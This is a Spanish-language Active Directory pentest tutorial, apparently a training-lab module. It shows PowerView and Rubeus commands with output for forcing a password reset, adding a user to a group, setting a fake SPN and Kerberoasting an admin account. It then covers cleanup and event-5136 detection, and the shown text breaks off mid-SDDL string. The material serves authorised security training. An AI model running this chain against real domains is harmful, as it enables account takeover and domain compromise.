
# Tácticas de abuso de ACLs

## <mark style="color:purple;">Abuso de las ACL</mark>

Una vez más, vamos a recapitular dónde estamos y a dónde queremos llegar. Tenemos el control del usuario `wley` cuyo hash NTLMv2 recuperamos al ejecutar Responder anteriormente en la evaluación. Por suerte para nosotros, este usuario estaba usando una contraseña débil y pudimos descifrar el hash sin conexión usando Hashcat y recuperar el valor de texto sin formato. Sabemos que podemos usar este acceso para iniciar una cadena de ataques que dará como resultado que tomemos el control del usuario `adunn` que puede realizar el ataque DCSync, lo que nos daría el control total del dominio al permitirnos recuperar los hashes de contraseñas NTLM para todos los usuarios del dominio y escalar privilegios a Administrador de dominio/empresa e incluso lograr persistencia. Para realizar la cadena de ataques, tenemos que hacer lo siguiente:

1. Utilizar el usuario `wley` para cambiar la contraseña del usuario `damundsen`
2. Autenticarnos como `damundsen` y aprovechar los derechos `GenericAll` para agregar un usuario que controlamos al grupo `Help Desk Level 1`
3. Aprovechar la membresía de grupo anidada en el grupo `Information Technology` y los derechos `GenericAll` para tomar el control del usuario `adunn`.

Entonces, primero debemos autenticarnos como el usuario `wley` y forzar el cambio de contraseña de `damundsen`. Podemos comenzar abriendo una consola de PowerShell y autenticándonos como `wley`. De lo contrario, podríamos omitir este paso si ya estuviéramos ejecutando como este usuario. Para ello, podemos crear un [objeto PSCredential](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) .

### **Creación de un objeto PSCredential**

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

A continuación, debemos crear un [objeto SecureString](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) que represente la contraseña que queremos establecer para el usuario objetivo `damundsen`.

### **Creación de un objeto SecureString**

```powershell
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Por último, utilizaremos la función [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) de PowerView para cambiar la contraseña del usuario. Necesitamos utilizar el indicador `-Credential` con el objeto de credenciales que creamos para el usuario `wley`. Es mejor especificar siempre el indicador `-Verbose` para obtener información sobre la finalización del comando según lo esperado o la mayor cantidad de información posible sobre los errores. Podríamos hacer esto desde un host de ataque Linux utilizando una herramienta como `pth-net`, que es parte del [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) .

### **Cambiar la contraseña del usuario**

```powershell
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

Podemos ver que el comando se completó correctamente, cambiando la contraseña del usuario de destino mientras se utilizan las credenciales que especificamos para el usuario `wley` que controlamos. A continuación, debemos realizar un proceso similar para autenticarnos como `damundsen` y agregarnos al grupo `Help Desk Level 1`.

### **Creación de un objeto SecureString con damundsen**

```powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```

A continuación, podemos utilizar la función [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) para agregarnos al grupo de destino. Primero podemos confirmar que nuestro usuario no es miembro del grupo de destino. Esto también se puede hacer desde un host Linux utilizando el `pth-toolkit`.

### **Incorporación de Damundsen al grupo de Help Desk Level 1**

```powershell
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

```powershell
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

Una rápida comprobación muestra que nuestra incorporación al grupo fue un éxito.

### **Confirmando que Damundsen fue agregado al grupo**

Con el siguiente comando podemos ver los miembros que pertenecen a cualquier grupo dentro de un entorno Active Directory:

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne
```

En este punto, deberíamos poder aprovechar nuestra nueva membresía de grupo para tomar el control del usuario `adunn`. Ahora, digamos que nuestro cliente nos permitió cambiar la contraseña del usuario `damundsen`, pero el usuario `adunn` es una cuenta de administrador que no se puede interrumpir. Dado que tenemos derechos `GenericAll` sobre esta cuenta, podemos divertirnos aún más y realizar un ataque Kerberoast dirigido modificando el [atributo servicePrincipalName](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) de la cuenta para crear un SPN falso que luego podemos Kerberoastizar para obtener el ticket TGS y (con suerte) descifrar el hash sin conexión usando Hashcat.

Para que esto tenga éxito, debemos estar autenticados como miembros del grupo `Information Technology`. Como agregamos `damundsen` al grupo `Help Desk Level 1`, heredamos los derechos a través de la membresía del grupo anidado. Ahora podemos usar [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) para crear el SPN falso. Podríamos usar la herramienta [objectiveKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) para realizar este mismo ataque desde un host Linux, y creará un SPN temporal, recuperará el hash y eliminará el SPN temporal, todo en un solo comando.

### **Creando un SPN falso**

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

Si esto funcionara, deberíamos poder aplicar Kerberoast al usuario mediante cualquier cantidad de métodos y obtener el hash para descifrarlo sin conexión. Hagámoslo con Rubeus.

### **Kerberosting con Rubeus**

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

¡Genial! Hemos obtenido el hash con éxito. El último paso es intentar descifrar la contraseña sin conexión mediante Hashcat. Una vez que tengamos la contraseña en texto plano, podremos autenticarnos como el usuario `adunn` y realizar el ataque DCSync, que abordaremos en la siguiente sección.

***

## <mark style="color:purple;">Limpiar evidencias</mark>

En términos de limpieza, hay algunas cosas que debemos hacer:

1. Eliminar el SPN falso que creamos en el usuario `adunn`.
2. Eliminar al usuario `damundsen` del grupo `Help Desk Level 1`
3. Restablecer la contraseña del usuario  `damundsen` a su valor original (si lo conocemos) o haga que nuestro cliente la configure/alerte al usuario

{% hint style="warning" %}
Este orden es importante porque si eliminamos al usuario del grupo primero, entonces no tendremos los derechos para eliminar el SPN falso.
{% endhint %}

Primero, eliminemos el SPN falso de la cuenta `adunn`.

**Cómo eliminar el SPN falso de la cuenta de adunn**

```powershell
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

A continuación, eliminaremos al usuario del grupo mediante `Remove-DomainGroupMember`.

**Eliminación de Damundsen del grupo de Help Desk Level 1**

```powershell-session
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

Podemos confirmar que el usuario efectivamente fue eliminado:

**Confirmado que Damundsen fue eliminado del grupo**

```powershell
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

Aunque hayamos realizado la mayor cantidad de limpieza posible, debemos incluir todas las modificaciones que hagamos en nuestro informe de evaluación final. Nuestro cliente querrá estar informado de cualquier cambio en el entorno, y registrar por escrito todo lo que hacemos durante una evaluación nos ayuda a nosotros y a nuestro cliente en caso de que surjan preguntas.

Este es solo un ejemplo de ruta de ataque. Puede haber muchas rutas de ataque en un dominio grande, algunas más cortas y otras más complicadas. Si bien esta ruta era ficticia para este entorno de laboratorio específico, he visto rutas de ataque similares durante interacciones del mundo real, y los ataques ACL a menudo entran en juego para promover el acceso. Sin embargo, a veces, una cadena de ataques ACL puede requerir demasiado tiempo o ser potencialmente destructiva, por lo que es posible que prefiramos enumerar la ruta para presentarle a nuestro cliente evidencia suficiente para comprender el problema y realizar una solución.

***

## <mark style="color:purple;">Detección y remediación</mark>

Algunas recomendaciones sobre las ACL incluyen:

1. A`uditoría y eliminación de ACLs peligrosas`

Las organizaciones deben realizar auditorías de AD periódicas, pero también capacitar al personal interno para ejecutar herramientas como BloodHound e identificar ACL potencialmente peligrosas que puedan eliminarse.

2. `Supervisar la membresía de grupos`

La visibilidad de los grupos importantes es fundamental. Se deben supervisar todos los grupos de alto impacto del dominio para alertar al personal de TI sobre los cambios que podrían indicar una cadena de ataques de ACL.

3. `Auditar y monitorear cambios en ACLs`

La activación de la [política de auditoría de seguridad avanzada](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) puede ayudar a detectar cambios no deseados, especialmente [el ID de evento 5136: Se modificó un objeto de servicio de directorio](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136) , que indicaría que se modificó el objeto de dominio, lo que podría indicar un ataque de ACL. Si observamos el registro de eventos después de modificar la ACL del objeto de dominio, veremos que `5136`se creó un ID de evento:

**Visualización del ID de evento 5136**

![imagen](https://academy.hackthebox.com/storage/modules/143/event5136.png)

Si revisamos la pestaña, `Details` podemos ver que la información pertinente está escrita en [lenguaje de definición de descriptor de seguridad (SDDL),](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) que no es legible para humanos.

**Visualización de SDDL asociado**

![imagen](https://academy.hackthebox.com/storage/modules/143/event5136_sddl.png)

Podemos usar el [cmdlet ConvertFrom-SddlString](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2) para convertirlo a un formato legible.

**Conversión de la cadena SDDL a un formato legible**

```powershell
PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0fa